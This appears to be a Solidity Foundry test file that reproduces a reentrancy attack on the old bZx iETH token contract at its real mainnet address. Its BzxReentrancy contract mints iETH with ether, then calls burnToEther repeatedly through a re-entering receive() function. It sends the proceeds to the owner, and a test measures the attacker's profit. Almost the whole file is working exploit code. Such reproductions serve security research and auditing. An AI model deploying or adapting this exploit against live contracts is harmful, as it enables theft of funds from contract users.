// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IOldIETH {
    function mintWithEther(address) external payable returns (uint256);
    function burnToEther(address, uint256) external returns (uint256);
    function burn(address, uint256) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function tokenPrice() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalAssetSupply() external view returns (uint256);
}

interface IWETH {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

contract BzxReentrancy {
    IOldIETH constant iETH = IOldIETH(0x77f973FCaF871459aa58cd81881Ce453759281bC);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public owner;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;
    uint256 public burnAmount;
    bool public exploiting;

    constructor() {
        owner = msg.sender;
    }

    function exploit(uint256 _maxReentrancy) external payable {
        require(msg.sender == owner, "not owner");
        maxReentrancy = _maxReentrancy;
        reentrancyCount = 0;
        exploiting = true;

        console.log("Starting exploit with", msg.value / 1e18, "ETH");
        console.log("Token price before:", iETH.tokenPrice());
        console.log("Total supply before:", iETH.totalSupply());

        // Mint iETH
        uint256 minted = iETH.mintWithEther{value: msg.value}(address(this));
        console.log("Minted:", minted);

        // Get our iETH balance
        uint256 ieth_bal = iETH.balanceOf(address(this));
        burnAmount = ieth_bal / (_maxReentrancy + 1);

        console.log("iETH balance:", ieth_bal);
        console.log("Burn amount per call:", burnAmount);
        console.log("Token price after mint:", iETH.tokenPrice());

        // Burn to trigger reentrancy
        iETH.burnToEther(address(this), burnAmount);

        console.log("After reentrancy: count =", reentrancyCount);
        console.log("Token price after burns:", iETH.tokenPrice());

        // After all reentrancy, burn remaining
        uint256 remaining = iETH.balanceOf(address(this));
        console.log("Remaining iETH:", remaining);
        if (remaining > 0) {
            iETH.burnToEther(address(this), remaining);
        }

        // Also check if we got any WETH
        uint256 wethBal = WETH.balanceOf(address(this));
        if (wethBal > 0) {
            console.log("Got WETH:", wethBal);
            WETH.withdraw(wethBal);
        }

        exploiting = false;

        console.log("Final ETH balance:", address(this).balance);

        // Send all ETH to owner
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (exploiting && reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            uint256 ieth_bal = iETH.balanceOf(address(this));
            console.log("Reentrancy count:", reentrancyCount);
            console.log("  iETH bal:", ieth_bal);
            console.log("  price:", iETH.tokenPrice());
            if (ieth_bal >= burnAmount && burnAmount > 0) {
                iETH.burnToEther(address(this), burnAmount);
            }
        }
    }
}

contract TestBzxReentrancy is Test {
    IOldIETH constant iETH = IOldIETH(0x77f973FCaF871459aa58cd81881Ce453759281bC);

    function test_reentrancy() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);

        vm.startPrank(attacker);
        BzxReentrancy exploit = new BzxReentrancy();

        uint256 balBefore = attacker.balance;
        console.log("Before:", balBefore);

        exploit.exploit{value: 1 ether}(3);

        uint256 balAfter = attacker.balance;
        console.log("After:", balAfter);

        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }

        vm.stopPrank();
    }
}
